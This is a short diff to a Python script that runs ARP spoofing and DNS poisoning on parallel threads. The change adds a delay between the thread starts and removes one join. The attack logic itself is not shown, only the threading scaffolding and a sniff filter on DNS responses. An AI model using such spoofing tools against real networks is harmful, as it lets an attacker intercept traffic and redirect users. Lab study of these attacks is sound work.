@@ -37,15 +37,17 @@ def dns_poisoning():
     sniff(prn=edit_response,filter='udp src port 53 and host '+DNS_IP,count=3)
 
 
+
 def main():
     #open two threads, one for arpspoofing and another for dns poisoning
     t = threading.Thread(name='arps', target=arpspoofing_adapter)
     s=threading.Thread(name='sniffer', target=dns_poisoning)
 
     t.start()
+    time.sleep(3)
     s.start()
 
-    t.join()
     s.join()
+
 
 #    sniff(prn=send_response,filter=is_dns_query)
